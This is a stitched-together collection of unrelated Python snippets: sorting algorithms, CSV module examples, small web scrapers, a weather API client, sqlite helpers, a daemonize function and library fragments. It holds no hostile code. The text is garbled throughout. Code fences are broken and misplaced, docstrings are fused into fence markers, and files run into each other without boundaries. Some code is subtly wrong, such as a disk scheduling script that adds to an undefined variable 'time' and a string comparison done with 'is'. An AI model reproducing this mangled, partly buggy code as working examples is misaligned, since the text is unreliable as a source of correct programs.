def counting_sort_list(items: Sequence[T], key: Callable[[T], int] = lambda x: x):
    max_value = max(map(key, items))
    count = [0] * (max_value + 1)
    for item in items:
        count[key(item)] += 1
    count = list(accumulate(count, initial=0))
    ret = [None] * len(items)
    for item in items:
        i = count[key(item)]
        ret[i] = item
        count[key(item)] = i + 1
    return ret
````

````py
ID: 29227b58-d1f9-4575-bdf7-13dea23d77fb
https://en.wikipedia.org/wiki/Counting_sort```


```py
from collections.abc import Callable, Sequence
from itertools import accumulate

from src.typehints import T


def counting_sort_list(items: Sequence[T], key: Callable[[T], int] = lambda x: x):
    max_value = max(map(key, items))
    count = [0] * (max_value + 1)
    for item in items:
        count[key(item)] += 1
    count = list(accumulate(count, initial=0))
    ret = [None] * len(items)
    for item in items:
        i = count[key(item)]
        ret[i] = item
        count[key(item)] = i + 1
    return ret

from __future__ import print_function

# Python program for counting sort

# This is the main function that sort the given string arr[] in
# in the alphabetical order
def countSort(arr):

    # The output character array that will have sorted arr
    output = [0 for i in range(256)]

    # Create a count array to store count of inidividul
    # characters and initialize count array as 0
    count = [0 for i in range(256)]

    # For storing the resulting answer since the
    # string is immutable
    ans = ["" for _ in arr]

    # Store count of each character
    for i in arr:
        count[ord(i)] += 1

    # Change count[i] so that count[i] now contains actual
    # position of this character in output array
    for i in range(256):
        count[i] += count[i - 1]

    # Build the output character array
    for i in range(len(arr)):
        output[count[ord(arr[i])] - 1] = arr[i]
        count[ord(arr[i])] -= 1

    # Copy the output array to arr, so that arr now
    # contains sorted characters
    for i in range(len(arr)):
        ans[i] = output[i]
    return ans


# Driver program to test above function
arr = "thisisthestring"
ans = countSort(arr)
print("Sorted string array is %s" % ("".join(ans)))

# have to use CSV
# In the file (population.csv), print out the names of the most
# populous countries and the number of people.
# We print out the countries and the populations that correspond
# to the medians of the population.
# (assuming that the number of countries is always odd)
# Create a function that outputs the Average population up
# to two decimal places.


import pprint


def get_population(filename):
    import os
    import csv
    import statistics

    fp = os.path.join(os.getcwd(), filename)

    with open(fp, "r") as data:

        csv_reader = csv.DictReader(data)

        country = []
        population = []

        for line in csv_reader:
            country.append(line["Country (or dependent territory)"])
            population.append(int(line["Population"]))

        # 1st question: Max population
        max_pop = max(population)
        idx_pop = population.index(max_pop)
        print(
            f"{country[idx_pop]} is the most populous country with a pop'n of {max_pop}."
        )

        # 2nd question: Median population
        median_pop = statistics.median(population)
        idx_pop = population.index(median_pop)
        print(f"{country[idx_pop]} is the median country with a pop'n of {median_pop}.")

        # 3rd quesiton: Average population
        ave_pop = statistics.mean(population)
        print("The average population is %.2f." % ave_pop)


file = "population.csv"
get_population(file)
````

````py
This is to show simple COVID19 info fetching from worldometers site using lxml
* The main motivation to use lxml in place of bs4 is that it is faster and therefore
more convenient to use in Python web projects (e.g. Django or Flask-based)```


```py

from collections import namedtuple

import requests
from lxml import html  # type: ignore

covid_data = namedtuple("covid_data", "cases deaths recovered")


def covid_stats(url: str = "https://www.worldometers.info/coronavirus/") -> covid_data:
    xpath_str = '//div[@class = "maincounter-number"]/span/text()'
    return covid_data(*html.fromstring(requests.get(url).content).xpath(xpath_str))


fmt = """Total COVID-19 cases in the world: {}
Total deaths due to COVID-19 in the world: {}
Total COVID-19 patients recovered in the world: {}"""
print(fmt.format(*covid_stats()))

from prompt_toolkit.key_binding.key_processor import KeyPressEvent
from prompt_toolkit.keys import Keys

from ..key_bindings import KeyBindings

__all__ = ["load_cpr_bindings"]

E = KeyPressEvent


def load_cpr_bindings() -> KeyBindings:
    key_bindings = KeyBindings()

    @key_bindings.add(Keys.CPRResponse, save_before=lambda e: False)
    def _(event: E) -> None:
        """
        Handle incoming Cursor-Position-Request response.
        """
        # The incoming data looks like u'\x1b[35;1R'
        # Parse row/col information.
        row, col = map(int, event.data[2:-1].split(";"))

        # Report absolute cursor position to the renderer.
        event.app.renderer.report_absolute_cursor_row(row)

    return key_bindings

import sys
import webbrowser

import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

if __name__ == "__main__":
    print("Googling.....")
    url = "https://www.google.com/search?q=" + " ".join(sys.argv[1:])
    res = requests.get(url, headers={"UserAgent": UserAgent().random})
    # res.raise_for_status()
    with open("project1a.html", "wb") as out_file:  # only for knowing the class
        for data in res.iter_content(10000):
            out_file.write(data)
    soup = BeautifulSoup(res.text, "html.parser")
    links = list(soup.select(".eZt8xd"))[:5]

    print(len(links))
    for link in links:
        if link.text == "Maps":
            webbrowser.open(link.get("href"))
        else:
            webbrowser.open(f"http://google.com{link.get('href')}")
````

````py
Get the citation from google scholar
using title and year of publication, and volume and pages of journal.```


```py

import requests
from bs4 import BeautifulSoup


def get_citation(base_url: str, params: dict) -> str:
    """
    Return the citation number.
    """
    soup = BeautifulSoup(requests.get(base_url, params=params).content, "html.parser")
    div = soup.find("div", attrs={"class": "gs_ri"})
    anchors = div.find("div", attrs={"class": "gs_fl"}).find_all("a")
    return anchors[2].get_text()


if __name__ == "__main__":
    params = {
        "title": (
            "Precisely geometry controlled microsupercapacitors for ultrahigh areal "
            "capacitance, volumetric capacitance, and energy density"
        ),
        "journal": "Chem. Mater.",
        "volume": 30,
        "pages": "3979-3990",
        "year": 2018,
        "hl": "en",
    }
    print(get_citation("http://scholar.google.com/scholar_lookup", params=params))

class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def bstFromPreorder(self, preorder):
        if not preorder:
            return None
        root = TreeNode(preorder[0])
        i = 1
        while i < len(preorder) and preorder[i] < root.val:
            i += 1
        root.left = self.bstFromPreorder(preorder[1:i])
        root.right = self.bstFromPreorder(preorder[i:])
        return root


preorder = [19, 4, 8, 11]
bst = Solution()
bst.bstFromPreorder(preorder)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def fn(self, name="world"):  #
    print("Hello, %s." % name)


Hello = type("Hello", (object,), dict(hello=fn))  # Hello class

h = Hello()
print("call h.hello():")
h.hello()
print("type(Hello) =", type(Hello))
print("type(h) =", type(h))

import sqlite3

sql_query = """
    CREATE TABLE IF NOT EXISTS Todo(
        id INTEGER PRIMARY KEY,
        task TEXT,
        complete boolean
    );```


```py


def execute_query(sql_query):
    with sqlite3.connect("todo.db") as conn:
        cur = conn.cursor()
        result = cur.execute(sql_query)
        conn.commit()
    return result


if __name__ == "__main__":
    execute_query(sql_query)

def gcd(a, b):
    while a != 0:
        a, b = b % a, a
    return b


def findModInverse(a, m):
    if gcd(a, m) != 1:
        return None
    u1, u2, u3 = 1, 0, a
    v1, v2, v3 = 0, 1, m
    while v3 != 0:
        q = u3 // v3
        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3
    return u1 % m

def csRaindrops(number):
    output = ""
    if number % 3 == 0:
        output += "Pling"

    if number % 5 == 0:
        output += "Plang"

    if number % 7 == 0:
        output += "Plong"

    if output is "":
        return str(number)

    return output


#
# Codewriting
#
# Given a number, write a function that converts that number into a string that contains "raindrop sounds" corresponding to certain potential factors. A factor is a number that evenly divides into another number, leaving no remainder. The simplest way to test if one number is a factor of another is to use the modulo operator.
#
# Here are the rules for csRaindrop. If the input number:
#
# has 3 as a factor, add "Pling" to the result.
# has 5 as a factor, add "Plang" to the result.
# has 7 as a factor, add "Plong" to the result.
# does not have any of 3, 5, or 7 as a factor, the result should be the digits of the input number.
# Examples:
#
# csRaindrops(28) -> "Plong"
# 28 has 7 as a factor, but not 3 or 5.
# csRaindrops(30) -> "PlingPlang"
# 30 has both 3 and 5 as factors, but not 7.
# csRaindrops(34) -> "34"
# 34 is not factored by 3, 5, or 7.
# [execution time limit] 4 seconds (py3)
#
# [input] integer number
#
# [output] string

#
# Binary trees are already defined with this interface:
class Tree(object):
    def __init__(self, x):
        self.value = x
        self.left = None
        self.right = None


def csBSTRangeSum(root, lower, upper):
    if not root:
        return 0
    res = 0

    if lower <= root.value <= upper:
        res += root.value
        res += csBSTRangeSum(root.left, lower, upper)
        res += csBSTRangeSum(root.right, lower, upper)
    elif root.value < lower:
        res += csBSTRangeSum(root.right, lower, upper)
    elif root.value > upper:
        res += csBSTRangeSum(root.left, lower, upper)
    return res

# Given a binary tree, write a function that inverts the tree.
#
# Example:
#
# Input:
#      6
#    /   \
#   4     8
#  / \   / \
# 2   5 7   9
#
# Output:
#      6
#    /   \
#   8     4
#  / \   / \
# 9   7 5   2
# [execution time limit] 4 seconds (py3)
#
# [input] tree.integer root
#
# [output] tree.integer
# -----------------------------------------------------------------------------------------
# Binary trees are already defined with this interface:
class Tree(object):
    def __init__(self, x):
        self.value = x
        self.left = None
        self.right = None


def csBinaryTreeInvert(root):
    if not root or (not root.left and not root.right):
        return root
    tmp = root.left
    root.left = root.right
    root.right = tmp
    csBinaryTreeInvert(root.left)
    csBinaryTreeInvert(root.right)
    return root

from collections import defaultdict


def dfs(s):
    # Append the node in path
    # and set visited
    path.append(s)
    visited[s] = True

    # Path started with a node
    # having in-degree 0 and
    # current node has out-degree 0,
    # print current path
    if outdeg0[s] and indeg0[path[0]]:
        print(*path)

    # Recursive call to print all paths
    for node in adj[s]:
        if not visited[node]:
            dfs(node)

    # Remove node from path
    # and set unvisited
    path.pop()
    visited[s] = False


def csFindAllPathsFromAToB(graph):
    for i in range(graph):

        # for each node with in-degree 0
        # print all possible paths
        if indeg0[i] and adj[i]:
            path = []
            visited = [False] * (graph + 1)
            dfs(i)


# Driver code

graph = 6
# set all nodes unvisited
visited = [False] * (graph + 1)
path = []

# edges = (a, b): a -> b
edges = [(5, 0), (5, 2), (2, 3), (4, 0), (4, 1), (3, 1)]

# adjacency list for nodes
adj = defaultdict(list)

# indeg0 and outdeg0 arrays
indeg0 = [True] * graph
outdeg0 = [True] * graph

for edge in edges:
    u, v = edge[0], edge[1]
    # u -> v
    adj[u].append(v)

    # set indeg0[v] <- false
    indeg0[v] = False

    # set outdeg0[u] <- false
    outdeg0[u] = False

# print('All possible paths:')
csFindAllPathsFromAToB(graph)

# Python 3 implementation to
# reverse bits of a number


# function to reverse
# bits of a number
def csReverseIntegerBits(n):

    rev = 0

    # traversing bits of 'n' from the right
    while n > 0:

        # bitwise left shift 'rev' by 1
        rev = rev << 1

        # if current bit is '1'
        if n & 1 == 1:
            rev = rev ^ 1

        # bitwise right shift 'n' by 1
        n = n >> 1

    # required number
    return rev


# Driver code
n = 267
print(csReverseIntegerBits(n))

thm = int(0)
print("Enter the Number of Requests : ")  # Number of I/O Requets
req = int(input())
print("Enter the Initial Head Position : ")  # Initial position of Disk Head
hp = int(input())
pos = hp
print("Enter the Seek Rate : ")
srate = int(input())
print("Enter the Requests : ")
arr = [int(input()) for i in range(req)]
start = 0
end = 199  # Start and End of Head Positions
print(hp, end="")
if hp < 100:
    for i in range(
        pos, start - 1, -1
    ):  # Iterates the movement from initial to start of track
        if i in arr:
            thm += abs(pos - i)
            pos = i
            print(" -> ", i, end="")
            arr.remove(i)
    thm += abs(pos - start)
    pos = end  # Moves to end without scanning
    print(" -> ", start, end="")
    print(" -> ", end, end="")
    for i in range(end, hp + 1, -1):  # Scans back to initial head position
        if i in arr:
            thm += abs(pos - i)
            pos = i
            print(" -> ", i, end="")
            arr.remove(i)
else:
    for i in range(pos, end + 1):  # Iterates the movement from initial to end of track
        if i in arr:
            thm += abs(pos - i)
            pos = i
            print(" -> ", i, end="")
            arr.remove(i)
    thm += abs(pos - end)
    pos = start  # Moves to start without scanning
    print(" -> ", end, end="")
    for i in range(start, hp + 1):  # Scans back to initial head position
        if i in arr:
            time += abs(pos - i)
            pos = i
            print(" -> ", i, end="")
            arr.remove(i)
stime = thm * srate
print("\nThe Total Head Movement is", thm)
print("The Seek Time is", stime)

#!/usr/bin/env python
# -*- coding: utf-8 -*-```


```pysolution to the csv parsing problem, handling quotes and numric values"""


def convert_to_number(value):
    """converts the passed over string to a number, if possible"""

    try:
        return int(value)
    except ValueError:
        pass

    return value


def csv_parsing(csv):
    """returns list of string/numeric csv values"""

    count = 0
    values = []
    pos = 0
    while pos < len(csv):
        if csv[pos] == ",":  # skip comma from previous iteration
            pos += 1

        values.insert(count, "")
        while pos < len(csv) and csv[pos] != ",":
            if csv[pos] == '"' or csv[pos] == "'":  # handle quoted strings
                first_quote = pos
                pos += 1

                while pos < len(csv) and csv[pos] != csv[first_quote]:
                    values[count] += csv[pos]
                    pos += 1

            else:
                values[count] += csv[pos]

            pos += 1

        # if the value is numeric, this will convert it.
        values[count] = convert_to_number(values[count])

        count += 1
        pos += 1

    return values

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py

# end_pymotw_header
import csv

csv.register_dialect("pipes", delimiter="|")

with open("testdata.pipes", "r") as f:
    reader = csv.reader(f, dialect="pipes")
    for row in reader:
        print(row)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py

# end_pymotw_header
import csv
from io import StringIO
import textwrap

csv.register_dialect(
    "escaped", escapechar="\\", doublequote=False, quoting=csv.QUOTE_NONE
)
csv.register_dialect("singlequote", quotechar="'", quoting=csv.QUOTE_ALL)

# Generate sample data for all known dialects
samples = []
for name in sorted(csv.list_dialects()):
    buffer = StringIO()
    dialect = csv.get_dialect(name)
    writer = csv.writer(buffer, dialect=dialect)
    writer.writerow(
        (
            "col1",
            1,
            "10/01/2010",
            "Special chars \" ' {} to parse".format(dialect.delimiter),
        )
    )
    samples.append((name, dialect, buffer.getvalue()))

# Guess the dialect for a given sample, and then use the results
# to parse the data.
sniffer = csv.Sniffer()
for name, expected, sample in samples:
    print('Dialect: "{}"'.format(name))
    print("In: {}".format(sample.rstrip()))
    dialect = sniffer.sniff(sample, delimiters=",\t")
    reader = csv.reader(StringIO(sample), dialect=dialect)
    print("Parsed:\n  {}\n".format("\n  ".join(repr(r) for r in next(reader))))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py

# end_pymotw_header
import csv
import sys

csv.register_dialect(
    "escaped", escapechar="\\", doublequote=False, quoting=csv.QUOTE_NONE
)
csv.register_dialect("singlequote", quotechar="'", quoting=csv.QUOTE_ALL)

quoting_modes = {getattr(csv, n): n for n in dir(csv) if n.startswith("QUOTE_")}

TEMPLATE = """\
Dialect: "{name}"

  delimiter   = {dl!r:<6}    skipinitialspace = {si!r}
  doublequote = {dq!r:<6}    quoting          = {qu}
  quotechar   = {qc!r:<6}    lineterminator   = {lt!r}
  escapechar  = {ec!r:<6}```


```py

for name in sorted(csv.list_dialects()):
    dialect = csv.get_dialect(name)

    print(
        TEMPLATE.format(
            name=name,
            dl=dialect.delimiter,
            si=dialect.skipinitialspace,
            dq=dialect.doublequote,
            qu=quoting_modes[dialect.quoting],
            qc=dialect.quotechar,
            lt=dialect.lineterminator,
            ec=dialect.escapechar,
        )
    )

    writer = csv.writer(sys.stdout, dialect=dialect)
    writer.writerow(
        (
            "col1",
            1,
            "10/01/2010",
            "Special chars: \" ' {} to parse".format(dialect.delimiter),
        )
    )
    print()

#!/usr/bin/env python3
````

`pyDictionary reader.`

````py
# end_pymotw_header
import csv
import sys

with open(sys.argv[1], "rt") as f:
    reader = csv.DictReader(f)
    for row in reader:
        print(row)

#!/usr/bin/env python3```


```pyExample of writing a comma separated value file.```


```py
# end_pymotw_header
import csv
import sys

fieldnames = ("Title 1", "Title 2", "Title 3", "Title 4")
headers = {n: n for n in fieldnames}
unicode_chars = "å∫ç"

with open(sys.argv[1], "wt") as f:

    writer = csv.DictWriter(f, fieldnames=fieldnames)
    writer.writeheader()

    for i in range(3):
        writer.writerow(
            {
                "Title 1": i + 1,
                "Title 2": chr(ord("a") + i),
                "Title 3": "08/{:02d}/07".format(i + 1),
                "Title 4": unicode_chars[i],
            }
        )

print(open(sys.argv[1], "rt").read())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyList the registered dialects.```


```py
# end_pymotw_header
import csv

print(csv.list_dialects())

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyExample of reading a comma separated value file.```


```py
# end_pymotw_header
import csv
import sys

with open(sys.argv[1], "rt") as f:
    reader = csv.reader(f)
    for row in reader:
        print(row)
````

````py
A markdown table looks like

| Syntax    | Description |
| --------- | ----------- |
| Header    | Title       |
| Paragraph | Text        |

This script takes path of csv file as an input and converts it into a markdown file```


```py

import os
import csv

input_path = input("Input full path of the csv file:")
# takes input of the type of delimiter in CSV file
type_del = input(
    "Enter the type of delemiter example ',' '|' ';' for space enter 'space' for tab enter 'tab' or any other : "
)

if type_del == "space":
    type_del = " "

if type_del == "tab":
    type_del = "\t"

# creating a string with .md extension for the output file
output_file = input_path.replace(".csv", ".md")

# I used encoding UTF-8 as we won't have to worry about errors while decoding contents of a csv file
csv_dict = csv.DictReader(open(input_path, encoding="UTF-8"), delimiter=type_del)

# storing the content of csv file in a list_of_rows. Each row is a dict.

list_of_rows = [dict_row for dict_row in csv_dict]

# For Headers of the csv file.
headers = list(list_of_rows[0].keys())

# The below code block makes md_string as per the required format of a markdown file.

md_string = " | "
for header in headers:
    md_string += header + " |"

md_string += "\n |"
for i in range(len(headers)):
    md_string += "--- | "

md_string += "\n"
for row in list_of_rows[1:]:
    md_string += " | "
    for header in headers:
        md_string += row[header] + " | "
    md_string += "\n"

# writing md_string to the output_file
file = open(output_file, "w", encoding="UTF-8")
file.write(md_string)
file.close()

print("The markdown file has been created!!!")

#!/usr/bin/env python3
# -*- encoding: utf-8 -*-```


```pyExample of writing a comma separated value file.```


```py
# end_pymotw_header
import csv
import sys

unicode_chars = "å∫ç"

with open(sys.argv[1], "wt") as f:
    writer = csv.writer(f)
    writer.writerow(("Title 1", "Title 2", "Title 3", "Title 4"))
    for i in range(3):
        row = (i + 1, chr(ord("a") + i), "08/{:02d}/07".format(i + 1), unicode_chars[i])
        writer.writerow(row)

print(open(sys.argv[1], "rt").read())

#!/usr/bin/env python3
# -*- encoding: utf-8 -*-```


```pyWriting a comma separated value file using more quoting.```


```py
# end_pymotw_header
import csv
import sys

unicode_chars = "å∫ç"

with open(sys.argv[1], "wt") as f:
    writer = csv.writer(f, quoting=csv.QUOTE_NONNUMERIC)
    writer.writerow(("Title 1", "Title 2", "Title 3", "Title 4"))
    for i in range(3):
        row = (i + 1, chr(ord("a") + i), "08/{:02d}/07".format(i + 1), unicode_chars[i])
        writer.writerow(row)

print(open(sys.argv[1], "rt").read())

# reading the currency file first
with open("currency") as f:
    lines = f.readlines()
print(lines)
currencyDict = {}
# fetching all data
for line in lines:
    parsed = line.split("\t")
    currencyDict[parsed[0]] = parsed[1]
print(currencyDict)
amount = int(input("enter the amount: \n"))
print("Enter the name of the country of which you want to convert currency")
print("Available options for conversion is: \n")
[print(item) for item in currencyDict.keys()]
currency = input("Please enter the currency you want to convert")
print(f"{amount} INR is equal to  {amount*float(currencyDict[currency])}" f"{currency}")

import requests
from bs4 import BeautifulSoup


def stock_price(symbol: str = "AAPL") -> str:
    url = f"https://in.finance.yahoo.com/quote/{symbol}?s={symbol}"
    soup = BeautifulSoup(requests.get(url).text, "html.parser")
    class_ = "My(6px) Pos(r) smartphone_Mt(6px)"
    return soup.find("div", class_=class_).find("span").text


if __name__ == "__main__":
    for symbol in "AAPL AMZN IBM GOOG MSFT ORCL".split():
        print(f"Current {symbol:<4} stock price is {stock_price(symbol):>8}")

import requests

APPID = ""  # <-- Put your OpenWeatherMap appid here!
URL_BASE = "http://api.openweathermap.org/data/2.5/"


def current_weather(q: str = "Chicago", appid: str = APPID) -> dict:
    """https://openweathermap.org/api"""
    return requests.get(URL_BASE + "weather", params=locals()).json()


def weather_forecast(q: str = "Kolkata, India", appid: str = APPID) -> dict:
    """https://openweathermap.org/forecast5"""
    return requests.get(URL_BASE + "forecast", params=locals()).json()


def weather_onecall(lat: float = 55.68, lon: float = 12.57, appid: str = APPID) -> dict:
    """https://openweathermap.org/api/one-call-api"""
    return requests.get(URL_BASE + "onecall", params=locals()).json()


if __name__ == "__main__":
    from pprint import pprint

    while True:
        location = input("Enter a location:").strip()
        if location:
            pprint(current_weather(location))
        else:
            break

# -*- coding=utf-8 -*-
from __future__ import absolute_import, print_function

import os
import sys

__all__ = ["hide_cursor", "show_cursor", "get_stream_handle"]


def get_stream_handle(stream=sys.stdout):
    """
    Get the OS appropriate handle for the corresponding output stream.

    :param str stream: The the stream to get the handle for
    :return: A handle to the appropriate stream, either a ctypes buffer
             or **sys.stdout** or **sys.stderr**.
    """
    handle = stream
    if os.name == "nt":
        from ._winconsole import get_stream_handle as get_win_stream_handle

        return get_win_stream_handle(stream)
    return handle


def hide_cursor(stream=sys.stdout):
    """
    Hide the console cursor on the given stream

    :param stream: The name of the stream to get the handle for
    :return: None
    :rtype: None
    """

    handle = get_stream_handle(stream=stream)
    if os.name == "nt":
        from ._winconsole import hide_cursor

        hide_cursor()
    else:
        handle.write("\033[?25l")
        handle.flush()


def show_cursor(stream=sys.stdout):
    """
    Show the console cursor on the given stream

    :param stream: The name of the stream to get the handle for
    :return: None
    :rtype: None
    """

    handle = get_stream_handle(stream=stream)
    if os.name == "nt":
        from ._winconsole import show_cursor

        show_cursor()
    else:
        handle.write("\033[?25h")
        handle.flush()
````

```pySimple script to compute the api hash of the current API.

The API has is defined by numpy_api_order and ufunc_api_order.
```

```py
from os.path import dirname

from code_generators.genapi import fullapi_hash
from code_generators.numpy_api import full_api

if __name__ == "__main__":
    curdir = dirname(__file__)
    print(fullapi_hash(full_api))
```

````py
Code contributed by Honey Sharma
Source: https://en.wikipedia.org/wiki/Cycle_sort```


```py


def cycle_sort(array: list) -> list:
    """
    >>> cycle_sort([4, 3, 2, 1])
    [1, 2, 3, 4]

    >>> cycle_sort([-4, 20, 0, -50, 100, -1])
    [-50, -4, -1, 0, 20, 100]

    >>> cycle_sort([-.1, -.2, 1.3, -.8])
    [-0.8, -0.2, -0.1, 1.3]

    >>> cycle_sort([])
    []
    """
    array_len = len(array)
    for cycle_start in range(0, array_len - 1):
        item = array[cycle_start]

        pos = cycle_start
        for i in range(cycle_start + 1, array_len):
            if array[i] < item:
                pos += 1

        if pos == cycle_start:
            continue

        while item == array[pos]:
            pos += 1

        array[pos], item = item, array[pos]
        while pos != cycle_start:
            pos = cycle_start
            for i in range(cycle_start + 1, array_len):
                if array[i] < item:
                    pos += 1

            while item == array[pos]:
                pos += 1

            array[pos], item = item, array[pos]

    return array


if __name__ == "__main__":
    assert cycle_sort([4, 5, 3, 2, 1]) == [1, 2, 3, 4, 5]
    assert cycle_sort([0, 1, -10, 15, 2, -2]) == [-10, -2, 0, 1, 2, 15]

# Code contributed by Honey Sharma
from __future__ import print_function


def cycle_sort(array):
    ans = 0

    # Pass through the array to find cycles to rotate.
    for cycleStart in range(0, len(array) - 1):
        item = array[cycleStart]

        # finding the position for putting the item.
        pos = cycleStart
        for i in range(cycleStart + 1, len(array)):
            if array[i] < item:
                pos += 1

        # If the item is already present-not a cycle.
        if pos == cycleStart:
            continue

        # Otherwise, put the item there or right after any duplicates.
        while item == array[pos]:
            pos += 1
        array[pos], item = item, array[pos]
        ans += 1

        # Rotate the rest of the cycle.
        while pos != cycleStart:

            # Find where to put the item.
            pos = cycleStart
            for i in range(cycleStart + 1, len(array)):
                if array[i] < item:
                    pos += 1

            # Put the item there or right after any duplicates.
            while item == array[pos]:
                pos += 1
            array[pos], item = item, array[pos]
            ans += 1

    return ans


#  Main Code starts here
if __name__ == "__main__":
    try:
        raw_input  # Python 2
    except NameError:
        raw_input = input  # Python 3

user_input = raw_input("Enter numbers separated by a comma:\n")
unsorted = [int(item) for item in user_input.split(",")]
n = len(unsorted)
cycle_sort(unsorted)

print("After sort : ")
for i in range(0, n):
    print(unsorted[i], end=" ")

def cyclic_rotation(arr, n):
    temp = arr[n - 1]
    for i in range(n - 1, 0, -1):
        arr[i] = arr[i - 1]
    arr[0] = temp


def print_array(arr, n):
    for i in range(n):
        print(arr[i])


arr = [1, 2, 3, 4, 5]

cyclic_rotation(arr, 5)

print_array(arr, 5)

def my_hash(key):
    sum = 0
    for c in key:
        nc = ord(c)
        sum += nc
    return sum


storage = [None] * 10
h = my_hash("CBA")
print(h)
n = h % len(storage)
print(n)


def put(key, value):
    idx = my_hash(key) % len(storage)
    storage[idx] = value


def get(key):
    idx = my_hash(key) % len(storage)
    return storage[idx]


put("Tom", 41)
# bryan@LAPTOP-9LGJ3JGS:/c/Lambda/CIRRICULUMN/_NOTES/CS-python-notes/WEEKS/wk17/d3$ python3 d3.py
# 198
# 8
# bryan@LAPTOP-9LGJ3JGS:/c/Lambda/CIRRICULUMN/_NOTES/CS-python-notes/WEEKS/wk17/d3$
````

```pydaemonize function from twisted.scripts._twistd_unix."""

# -----------------------------------------------------------------------------
# Copyright (c) Twisted Matrix Laboratories.
# See Twisted's LICENSE for details.
# http://twistedmatrix.com/
# -----------------------------------------------------------------------------

import os, errno


def daemonize():
    # See http://www.erlenstar.demon.co.uk/unix/faq_toc.html#TOC16
    if os.fork():  # launch child and...
        os._exit(0)  # kill off parent
    os.setsid()
    if os.fork():  # launch child and...
        os._exit(0)  # kill off parent again.
    null = os.open("/dev/null", os.O_RDWR)
    for i in range(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != errno.EBADF:
                raise
    os.close(null)

import requests
from bs4 import BeautifulSoup


def horoscope(zodiac_sign: int, day: str) -> str:
    url = (
        "https://www.horoscope.com/us/horoscopes/general/"
        f"horoscope-general-daily-{day}.aspx?sign={zodiac_sign}"
    )
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find("div", class_="main-horoscope").p.text


if __name__ == "__main__":
    print("Daily Horoscope. \n")
    print(
        "enter your Zodiac sign number:\n",
        "1. Aries\n",
        "2. Taurus\n",
        "3. Gemini\n",
        "4. Cancer\n",
        "5. Leo\n",
        "6. Virgo\n",
        "7. Libra\n",
        "8. Scorpio\n",
        "9. Sagittarius\n",
        "10. Capricorn\n",
        "11. Aquarius\n",
        "12. Pisces\n",
    )
    zodiac_sign = int(input("number> ").strip())
    print("choose some day:\n", "yesterday\n", "today\n", "tomorrow\n")
    day = input("enter the day> ")
    horoscope_text = horoscope(zodiac_sign, day)
    print(horoscope_text)

from __future__ import absolute_import

from functools import partial

from dask.callbacks import Callback

from .auto import tqdm as tqdm_auto

__author__ = {"github.com/": ["casperdcl"]}
__all__ = ["TqdmCallback"]


class TqdmCallback(Callback):
    """Dask callback for task progress."""

    def __init__(self, start=None, pretask=None, tqdm_class=tqdm_auto, **tqdm_kwargs):
        """
        Parameters
        ----------
        tqdm_class  : optional
            `tqdm` class to use for bars [default: `tqdm.auto.tqdm`].
        tqdm_kwargs  : optional
            Any other arguments used for all bars.
        """
        super(TqdmCallback, self).__init__(start=start, pretask=pretask)
        if tqdm_kwargs:
            tqdm_class = partial(tqdm_class, **tqdm_kwargs)
        self.tqdm_class = tqdm_class

    def _start_state(self, _, state):
        self.pbar = self.tqdm_class(
            total=sum(
                len(state[k]) for k in ["ready", "waiting", "running", "finished"]
            )
        )

    def _posttask(self, *_, **__):
        self.pbar.update()

    def _finish(self, *_, **__):
        self.pbar.close()

    def display(self):
        """Displays in the current cell in Notebooks."""
        container = getattr(self.bar, "container", None)
        if container is None:
            return
        from .notebook import display

        display(container)

from typing import NamedTuple

__all__ = ["Point", "Size"]


Point = NamedTuple("Point", [("x", int), ("y", int)])
Size = NamedTuple("Size", [("rows", int), ("columns", int)])

import sqlite3


class BookData:
    def __init__(self):
        self.conn = sqlite3.connect("books.db")
        self.cur = self.conn.cursor()
        self.cur.execute(
            "create table if not exists book (id INTEGER PRIMARY KEY,title TEXT,author TEXT,year INTEGER,isbn INTEGER)"
        )
        self.conn.commit()

    def insert_in_database(self, title, author, year, isbn):
        self.cur.execute(
            "insert into book values (null,?,?,?,?)", (title, author, year, isbn)
        )
        self.conn.commit()

    def view_data(self):
        self.cur.execute("select * from book")
        view = self.cur.fetchall()
        return view

    def search_in_database(self, title="", author="", year="", isbn=""):

        self.cur.execute(
            "select * from book where title=? or author=? or year=? or isbn=?",
            (title, author, year, isbn),
        )
        search = self.cur.fetchall()
        return search

    def update_record(self, id, title, author, year, isbn):
        self.cur.execute(
            "update book set title=?,author=?,year=?,isbn=? where id=?",
            (title, author, year, isbn, id),
        )
        self.conn.commit()

    def delete_record(self, id):
        self.cur.execute("delete from book where id=?", (id,))
        self.conn.commit()

    def __del__(self):
        self.conn.close()

from pathlib import Path
import numpy as np

path: Path
d1: np.DataSource

d1.abspath(path)  # E: incompatible type
d1.abspath(b"...")  # E: incompatible type

d1.exists(path)  # E: incompatible type
d1.exists(b"...")  # E: incompatible type

d1.open(path, "r")  # E: incompatible type
d1.open(b"...", encoding="utf8")  # E: incompatible type
d1.open(None, newline="/n")  # E: incompatible type
```

````pyFilter used to select the first preferred output format available.

The filter contained in the file allows the converter templates to select
the output format that is most valuable to the active export format.  The
value of the different formats is set via
NbConvertBase.display_data_priority```


```py
# -----------------------------------------------------------------------------
# Copyright (c) 2013, the IPython Development Team.
#
# Distributed under the terms of the Modified BSD License.
#
# The full license is in the file COPYING.txt, distributed with this software.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Classes and functions
# -----------------------------------------------------------------------------

from ..utils.base import NbConvertBase
from warnings import warn

__all__ = ["DataTypeFilter"]


class DataTypeFilter(NbConvertBase):
    """ Returns the preferred display format """

    def __call__(self, output):
        """ Return the first available format in the priority.

        Produces a UserWarning if no compatible mimetype is found.

        `output` is dict with structure {mimetype-of-element: value-of-element}

        """
        for fmt in self.display_data_priority:
            if fmt in output:
                return [fmt]
        warn(
            "Your element with mimetype(s) {mimetypes}"
            " is not able to be represented.".format(mimetypes=output.keys())
        )

        return []
````

`pyFor when pip wants to check the date or time.`

````py

import datetime


def today_is_later_than(year: int, month: int, day: int) -> bool:
